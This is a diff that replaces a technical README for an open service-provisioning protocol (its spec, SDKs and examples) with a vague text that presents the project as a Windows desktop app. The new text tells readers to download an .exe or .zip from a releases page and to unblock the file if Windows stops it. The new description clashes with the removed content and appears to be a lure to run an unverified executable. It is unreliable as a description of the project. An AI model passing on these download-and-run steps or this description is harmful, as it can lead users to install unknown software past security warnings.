@@ -1,269 +1,182 @@
-<div align="center">
-  <h1>Open Service Protocol (OSP)</h1>
-  <p><strong>The open standard for AI agents to discover, provision, and manage developer services.</strong></p>
-  <p><em>What MCP is to tool access, OSP is to service provisioning.</em></p>
-  <p>
-    <a href="https://osp.sh">Website</a> ·
-    <a href="spec/osp-v1.0.md">Specification</a> ·
-    <a href="schemas/">JSON Schemas</a> ·
-    <a href="docs/getting-started.md">Getting Started</a> ·
-    <a href="skills/">Provider Skills</a>
-  </p>
-  <p>
-    <img src="https://img.shields.io/badge/spec-v1.1--draft-blue" alt="Spec Version">
-    <img src="https://img.shields.io/badge/license-Apache%202.0-green" alt="License">
-    <img src="https://img.shields.io/badge/status-active%20development-orange" alt="Status">
-    <img src="https://img.shields.io/badge/SDKs-Rust%20%7C%20TypeScript%20%7C%20Python%20%7C%20Go-purple" alt="SDKs">
-  </p>
-</div>
+# ⚙️ osp - Run Service Tools With Ease
 
----
+[![Download osp](https://img.shields.io/badge/Download-osp-6e56cf?style=for-the-badge)](https://github.com/amosahd/osp/releases)
 
-## Why OSP Exists
+## 🧭 What osp does
 
-AI agents are becoming autonomous economic actors. They spin up databases, deploy apps, configure auth, and wire up analytics — all without human intervention. But today, every service has its own proprietary onboarding flow:
+osp is a desktop app for Windows that helps AI agents find, set up, and manage developer services.
 
-- **Stripe Projects** (launched March 2026) locks providers into Stripe's invite-only, single-rail ecosystem
-- **Manual signup flows** force agents to open browsers, solve CAPTCHAs, verify emails — things agents can't do
-- **Ad-hoc API wrapping** means every agent↔provider integration is custom, fragile, and non-standard
+It is built for service provisioning. That means it helps software connect to the tools and services it needs without manual setup every time.
 
-There is no open standard that lets an agent ask *"what services are available?"*, provision one, pay through any rail, receive encrypted credentials, and manage the lifecycle. **OSP fills this gap.**
+Use osp when you want a simple way to:
 
-### The Core Thesis
+- discover services
+- provision services
+- manage service access
+- keep service setup in one place
+- work with a provider-neutral system
 
-> Reusable credentials are the wrong primitive. Every service interaction should be a first-class protocol operation — discoverable, provisionable, rotatable, and auditable.
+osp fits well with AI agent workflows, dev tools, and local infrastructure tasks.
 
-OSP treats service provisioning as a protocol problem, not a platform problem. Any provider can implement it. Any agent can consume it. Any payment rail can settle it.
+## 💻 What you need
 
-## How It Works
+Before you install osp, make sure you have:
 
-```
-Agent                          Provider (e.g. Supabase)
-  |                                  |
-  |  GET /.well-known/osp.json      |
-  |--------------------------------->|  1. Discover: agent finds provider's manifest
-  |  { offerings, tiers, pricing }   |
-  |<---------------------------------|
-  |                                  |
-  |  POST /osp/v1/provision          |
-  |  { offering, tier, public_key }  |  2. Provision: agent requests a resource
-  |--------------------------------->|
-  |  { resource_id, credentials }    |
-  |<---------------------------------|  3. Credentials: Ed25519-encrypted, delivered securely
-  |                                  |
-  |  POST /osp/v1/rotate/{id}       |
-  |--------------------------------->|  4. Manage: rotate, upgrade, deprovision via standard endpoints
-  |  { new_credentials }             |
-  |<---------------------------------|
-```
+- a Windows PC
+- a stable internet connection
+- enough free disk space for the app and service data
+- permission to install apps on your computer
 
-**Provider publishes** `/.well-known/osp.json`:
-```json
-{
-  "provider_id": "supabase.com",
-  "display_name": "Supabase",
-  "offerings": [{
-    "offering_id": "supabase/postgres",
-    "name": "Managed PostgreSQL",
-    "category": "database",
-    "tiers": [
-      { "tier_id": "free", "name": "Free", "price": { "amount": "0", "currency": "USD" } },
-      { "tier_id": "pro", "name": "Pro", "price": { "amount": "25", "currency": "USD", "interval": "P1M" } }
-    ]
-  }],
-  "accepted_payment_methods": ["free", "sardis_wallet", "stripe_spt", "x402"]
-}
-```
+For best results, use a recent version of Windows 10 or Windows 11.
 
-**Agent provisions in one call:**
-```bash
-POST https://api.supabase.com/osp/v1/provision
-{
-  "offering_id": "supabase/postgres",
-  "tier_id": "free",
-  "project_name": "my-agent-app",
-  "agent_public_key": "base64url_ed25519_public_key"
-}
-# Returns: resource_id, encrypted credentials, connection strings
-```
+## 📥 Download osp
 
-## OSP vs. The Alternatives
+Visit this page to download the latest Windows release:
 
-| | Stripe Projects | Manual APIs | OSP |
-|---|---|---|---|
-| Provider onboarding | Invite-only | N/A | Self-registration via `.well-known` |
-| Protocol | Proprietary | Per-provider | Open standard (Apache 2.0) |
-| Payment rail | Stripe only | Per-provider | Any (Sardis, Stripe, x402, free) |
-| Discovery | CLI catalog | Documentation | `/.well-known/osp.json` + registry |
-| Credential security | Proprietary vault | Varies | Ed25519 encrypted bundles |
-| Agent delegation | No | No | A2A protocol support |
-| Cost controls | No | No | Budget guardrails, cost-in-PR |
-| Identity lifecycle | Static keys | Static keys | Short-lived tokens, NHI inventory |
+https://github.com/amosahd/osp/releases
 
-## Spec v1.1 Features
+Look for the newest file in the release list. On Windows, that is usually an `.exe` file or a `.zip` file.
 
-The OSP specification (~9,600 lines) covers the complete lifecycle:
+## 🪟 Install on Windows
 
-**Core Protocol** — Discovery, provisioning, credential encryption, billing, deprovisioning, webhooks, conformance levels
+Follow these steps:
 
-**v1.1 Additions:**
-- **A2A Agent Delegation** — Agent-to-agent delegated provisioning with task lifecycle tracking
-- **Non-Human Identity Lifecycle** — Short-lived tokens, NHI inventory, orphan detection, OIDC/SPIFFE federation
-- **FinOps Cost-as-Code** — Budget guardrails, cost-in-PR, anomaly detection, environment TTLs
-- **Service Dependency Graph** — Impact analysis, health propagation, auto-generated architecture docs
-- **Golden Paths + Scorecards** — Service maturity scoring, compliance checklists (SOC2/HIPAA/GDPR), guided remediation
-- **Agent Observability** — OpenTelemetry tracing, audit logs, human-in-the-loop gates, cost-per-action tracking
-- **MCP Alignment** — Combined `.well-known` discovery, Streamable HTTP transport bridge
-- **Progressive Deployment** — Canary provisioning with promote/rollback lifecycle
-- **Ephemeral Environments** — PR-triggered envs with TTL and shareable URLs
-- **TypeScript Config** — `osp.config.ts` with Pulumi-style programmatic configuration
-- **Provider Onboarding SDK** — Become OSP-compatible in hours, not weeks
+1. Open the download page above.
+2. Find the latest release.
+3. Download the Windows file.
+4. If you downloaded a `.zip` file, open it and extract the contents.
+5. If you downloaded an `.exe` file, double-click it to start the installer.
+6. If Windows asks for permission, choose Yes.
+7. Follow the on-screen steps until the install is done.
+8. Open osp from your Start menu or desktop shortcut.
 
-## Repository Structure
+If the app opens in a new window, the install worked.
 
-```
-osp/
-├── spec/                              # Protocol specification (9,600+ lines)
-│   └── osp-v1.0.md                   # Core spec document (v1.1 draft)
-├── schemas/                           # JSON Schema definitions (draft 2020-12)
-│   ├── service-manifest.schema.json
-│   ├── provision-request.schema.json
-│   ├── provision-response.schema.json
-│   ├── credential-bundle.schema.json
-│   ├── usage-report.schema.json
-│   ├── webhook-event.schema.json
-│   └── examples/                      # 14 example manifests (10 providers)
-├── osp-core/                          # Rust core implementation
-│   └── crates/
-│       ├── osp-crypto/                # Ed25519, x25519, canonical JSON
-│       ├── osp-manifest/              # Types, fetch, verify, validate, cache
-│       ├── osp-vault/                 # Encrypted credential storage
-│       ├── osp-cli/                   # CLI with 18 commands
-│       ├── osp-provider/              # Adapter trait + 8 provider adapters
-│       ├── osp-registry/              # axum server + SQLite registry
-│       ├── osp-conformance/           # Test suite + badge generation
-│       └── osp-sdk/                   # High-level Rust SDK
-├── reference-implementation/
-│   ├── typescript/                    # TypeScript SDK (v0.2.0, 139 tests)
-│   │   └── src/                       # Client, MCP server, resolver, plugins
-│   └── python/                        # Python SDK (v0.2.0, 171 tests)
-│       └── src/osp/                   # Client, provider, resolver, integrations
-├── osp-sdk-go/                        # Go SDK (142 tests)
-├── sardis-integration/                # Sardis payment rail integration
-│   └── src/                           # Payment flow, MCP extension, CLI bridge
-├── skills/                            # LLM integration skills (10 providers)
-├── website/                           # Next.js + Tailwind marketing site
-├── .github/workflows/                 # CI/CD (schema validation, tests, deploy)
-└── docs/                              # Guides and documentation
-    ├── getting-started.md
-    ├── for-providers.md
-    ├── for-agents.md
-    └── stripe-comparison.md
-```
+## ▶️ First run
 
-## SDKs
+When you start osp for the first time, you may see a setup screen.
 
-| Language | Package | Tests | Status |
-|----------|---------|-------|--------|
-| **Rust** | `osp-core` (8 crates) | 46 | Core implementation |
-| **TypeScript** | `@osp/client`, `@osp/mcp-server` | 139 | Production-grade with MCP tools |
-| **Python** | `osp-client` | 171 | Async client + FastAPI/Django integrations |
-| **Go** | `osp-sdk-go` | 142 | Full client + provider + crypto |
+Use it to:
 
-### TypeScript Quick Start
+- choose your basic settings
+- connect your service sources
+- review any default options
+- confirm where the app stores local data
 
-```typescript
-import { OSPClient } from '@osp/client';
+If the app asks for access to files, network, or local services, allow only what you need for your setup.
 
-const client = new OSPClient();
-const manifest = await client.discover('https://supabase.com');
-const result = await client.provision({
-  offering_id: 'supabase/postgres',
-  tier_id: 'free',
-  project_name: 'my-app',
-});
-console.log(result.credentials_bundle.credentials.SUPABASE_URL);
-```
+## 🧩 How osp works
 
-### Python Quick Start
+osp helps bridge the gap between AI agents and services.
 
-```python
-from osp import OSPClient
+In plain terms:
 
-async with OSPClient() as client:
-    manifest = await client.discover("https://supabase.com")
-    result = await client.provision(
-        offering_id="supabase/postgres",
-        tier_id="free",
-        project_name="my-app",
-    )
-    print(result.credentials_bundle.credentials["SUPABASE_URL"])
-```
+- an AI agent can ask for a service
+- osp helps find the right service
+- osp helps provision that service
+- osp helps manage it after setup
 
-### Go Quick Start
+This keeps service access more organized and reduces repeated manual work.
 
-```go
-client := osp.NewClient(osp.WithTimeout(30 * time.Second))
-manifest, _ := client.Discover(ctx, "https://supabase.com")
-result, _ := client.Provision(ctx, osp.ProvisionRequest{
-    OfferingID:  "supabase/postgres",
-    TierID:      "free",
-    ProjectName: "my-app",
-})
-fmt.Println(result.CredentialsBundle.Credentials["SUPABASE_URL"])
-```
+## 🔧 Common tasks
 
-## Provider Skills
+You can use osp to handle tasks such as:
 
-OSP includes LLM integration skills for 10 providers — structured knowledge files that help AI agents use each service effectively:
+- finding available services
+- setting up service access
+- checking service status
+- updating service settings
+- removing services you no longer need
 
-Supabase | Neon | Vercel | Clerk | Upstash | Resend | Cloudflare | PostHog | Turso | Railway
+It is useful for local development, test setups, and service workflows that need a clear structure.
 
-Each skill includes: Quick Start, Credentials, Common Operations, Framework Guides, and Gotchas.
+## 🗂️ Supported workflow areas
 
-## Sardis Integration
+osp is designed around:
 
-OSP is payment-rail agnostic. [Sardis](https://sardis.sh) is the founding maintainer and provides the reference payment integration:
+- AI agents
+- developer tools
+- infrastructure setup
+- service provisioning
+- open standards
+- machine-to-machine communication
 
-- **Payment Rail** — `sardis_wallet` payment method with escrow lifecycle
-- **MCP Extension** — 9 OSP tools for Claude/GPT agents
-- **CLI Bridge** — `sardis projects add` → OSP provision + Sardis payment
-- **Provider Verification Example** — [Sardis proof verification guide](docs/payments/sardis-provider-verification.md)
+It focuses on service access rather than user-facing chat tools.
 
-Other payment rails (Stripe SPT, x402, MPP, invoicing) are equally supported.
+## 🛠️ If the app does not open
 
-## Design Principles
+If osp does not start, try these steps:
 
-1. **Open.** Apache 2.0. No gatekeeping, no invite lists, no approval queues.
-2. **Payment-rail agnostic.** OSP does not privilege any payment system.
-3. **Provider-neutral.** Any service can implement OSP. No marketplace cut.
-4. **Machine-first.** Designed for agent↔provider interaction, not human UIs.
-5. **Secure by default.** Ed25519 signatures, encrypted credentials, short-lived tokens.
-6. **Observable.** OpenTelemetry traces, audit logs, cost tracking on every operation.
+1. Close the app.
+2. Run it again from the Start menu.
+3. Check that the download finished fully.
+4. If you used a `.zip` file, make sure you extracted it first.
+5. If Windows blocks the file, open the file’s properties and allow it.
+6. Restart your PC and try again.
 
-## Getting Started
+If the app still does not open, download the latest release again from the releases page.
 
-- **For Providers**: [How to make your service OSP-compatible](docs/for-providers.md)
-- **For Agent Developers**: [How to discover and provision services](docs/for-agents.md)
-- **Full Specification**: [OSP v1.1 spec](spec/osp-v1.0.md)
-- **Comparison**: [OSP vs Stripe Projects](docs/stripe-comparison.md)
+## 🔄 Update osp
 
-## Contributing
+To update osp on Windows:
 
-OSP is developed in the open. We welcome contributions:
+1. Go to the releases page.
+2. Download the newest version.
+3. Close the app before you install the new one.
+4. Install the new release over the old one, or replace the old app files if you used a zip package.
+5. Open the updated app.
 
-- **Protocol changes**: Submit a SIP (Service Improvement Proposal) as a GitHub Discussion
-- **New schemas**: Submit a PR to `schemas/`
-- **Provider adapters**: Submit a PR to `osp-core/crates/osp-provider/`
-- **SDK improvements**: Submit a PR to `reference-implementation/` or `osp-sdk-go/`
-- **New skills**: Submit a PR to `skills/`
+Keeping osp current helps you get the latest service support and fixes.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines.
+## 🧠 Useful terms
 
-## Founding Maintainers
+Here are a few simple terms you may see:
 
-- [Sardis](https://sardis.sh) — Payment OS for the Agent Economy
+- **Service**: A tool or system that osp can connect to
+- **Provisioning**: Setting up a service so it can be used
+- **Agent**: A software system that can act on requests
+- **Provider-neutral**: Not tied to one company or platform
+- **Protocol**: A shared way for systems to talk to each other
 
-## License
+## 📁 What is in the repo
 
-Apache 2.0 — see [LICENSE](LICENSE)
+The osp project is built as an open standard for service provisioning. It uses a cross-platform approach and fits modern developer workflows.
+
+You may see work tied to:
+
+- Rust
+- TypeScript
+- protocol design
+- local service management
+- AI agent integration
+
+## 🔐 Safety checks
+
+Before you run any downloaded file:
+
+- make sure it comes from the releases page
+- check that the file name matches the latest release
+- only use files from the official repository
+- keep your Windows security tools on
+
+## 🧪 Troubleshooting setup issues
+
+If setup fails, check these items:
+
+- the download finished fully
+- you have enough free storage
+- your internet connection is stable
+- Windows has not blocked the file
+- another app is not already using the same files
+
+If a service does not appear, refresh the app and check your connection settings.
+
+## 📌 Quick path
+
+1. Open the releases page  
+2. Download the latest Windows file  
+3. Install or extract it  
+4. Open osp  
+5. Follow the setup screen  
+6. Connect your services  
+7. Start using it
